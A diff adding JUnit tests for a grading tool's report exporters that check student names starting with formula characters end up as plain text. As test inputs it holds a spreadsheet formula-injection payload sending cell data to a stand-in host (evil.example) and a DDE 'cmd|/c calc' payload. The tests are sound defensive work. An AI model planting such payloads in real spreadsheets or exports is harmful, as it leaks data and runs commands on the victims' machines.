@@ -28,6 +28,8 @@ import java.util.Map;
 import java.util.UUID;
 import java.util.stream.IntStream;
 
+import org.apache.poi.ss.usermodel.Cell;
+import org.apache.poi.ss.usermodel.CellType;
 import org.apache.poi.ss.usermodel.Row;
 import org.apache.poi.xssf.usermodel.XSSFWorkbook;
 import org.gitgrader.courses.EnrollmentStatus;
@@ -35,12 +37,23 @@ import org.gitgrader.grading.GradingRunStatus;
 import org.gitgrader.grading.SubmissionScoreView;
 import org.gitgrader.identity.StudentStatus;
 import org.gitgrader.submissions.SubmissionStatus;
+import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
 import tools.jackson.databind.JsonNode;
 import tools.jackson.databind.ObjectMapper;
 
 import static org.assertj.core.api.Assertions.assertThat;
 
+/**
+ * Tests for {@link CsvReportExporter}, {@link XlsxReportExporter} and
+ * {@link JsonReportExporter}.
+ *
+ * <p>
+ * These carry names a student typed into an open registration form, so a cell starting
+ * with a character a spreadsheet treats as a formula must arrive as text. RFC quoting is
+ * no defence: the reader strips the quotes and reads the leading {@code =}, which is
+ * enough for {@code HYPERLINK}, {@code WEBSERVICE} or DDE.
+ */
 class ReportExporterTest {
 
 	private static final UUID COURSE_ID = UUID.fromString("00000000-0000-0000-0000-000000000001");
@@ -50,6 +63,7 @@ class ReportExporterTest {
 	private static final Clock CLOCK = Clock.fixed(Instant.parse("2026-07-30T12:00:00Z"), ZoneOffset.UTC);
 
 	@Test
+	@DisplayName("quotes CSV fields that contain commas, quotes or newlines")
 	void quotesCsvFieldsContainingCommasQuotesAndNewlines() {
 		CourseReport report = report("Lovelace, \"Ada\"\nCountess");
 
@@ -59,6 +73,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("creates an XLSX workbook a reader can open")
 	void createsReadableXlsxWorkbook() throws IOException {
 		CourseReport report = report("Ada Lovelace");
 
@@ -71,6 +86,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("exports every student of a class with assignment progress and the latest result")
 	void exportsEveryClassStudentWithAssignmentProgressAndLatestResult() throws IOException {
 		UUID secondStudentId = UUID.fromString("00000000-0000-0000-0000-000000000003");
 		UUID submissionId = UUID.fromString("00000000-0000-0000-0000-000000000004");
@@ -111,6 +127,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("blanks only the columns whose source is absent")
 	void blanksOnlyTheColumnsWhoseSourceIsAbsent() throws IOException {
 		UUID submissionId = UUID.fromString("00000000-0000-0000-0000-000000000004");
 		UUID assignmentId = UUID.fromString("00000000-0000-0000-0000-000000000006");
@@ -142,6 +159,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("keeps earned and available points distinct in the JSON export")
 	void keepsEarnedAndAvailablePointsDistinctInJson() throws IOException {
 		// Deliberately different values: an earlier defect reported the earned total in
 		// the available-points field, which is invisible whenever a fixture uses the same
@@ -161,6 +179,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("serialises a student who has never submitted")
 	void serialisesAStudentWhoHasNeverSubmitted() throws IOException {
 		// A student with no activity is the ordinary state at the start of a course, so
 		// the absent timestamp must serialise rather than fail the whole course export.
@@ -176,6 +195,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("neutralises a spreadsheet formula in a student-supplied name")
 	void neutralisesASpreadsheetFormulaInAStudentSuppliedName() {
 		// Registration is open to anyone and puts no character restriction on a name, so
 		// this is what a student can put in the instructor's spreadsheet. Opening the
@@ -192,6 +212,25 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("stores the same formula in an XLSX cell as text, not as a formula")
+	void storesFormulaInXlsxCellAsText() throws IOException {
+		// XLSX never prefixes the value, so nothing here would notice a regression to a
+		// formula cell: POI decides between a string cell and an evaluated formula from
+		// the type alone, and a reader that opens the workbook would run whatever the
+		// cell holds. The guard is the cell type, and it has to be asserted as one.
+		String name = "=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Grades\")";
+
+		byte[] bytes = new XlsxReportExporter().export(report(name));
+
+		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
+			Cell cell = workbook.getSheet("Course report").getRow(1).getCell(2);
+			assertThat(cell.getCellType()).isEqualTo(CellType.STRING);
+			assertThat(cell.getStringCellValue()).isEqualTo(name);
+		}
+	}
+
+	@Test
+	@DisplayName("neutralises every character a spreadsheet treats as a formula")
 	void neutralisesEveryCharacterASpreadsheetTreatsAsAFormula() {
 		for (String lead : List.of("=", "+", "-", "@", "\t", "\r")) {
 			String csv = new String(new CsvReportExporter().export(report(lead + "cmd|'/c calc'!A0")),
@@ -204,6 +243,7 @@ class ReportExporterTest {
 	}
 
 	@Test
+	@DisplayName("leaves an ordinary name alone")
 	void leavesAnOrdinaryNameAlone() {
 		// The guard must not reach names that were never dangerous, or every exported
 		// spreadsheet acquires punctuation nobody typed.
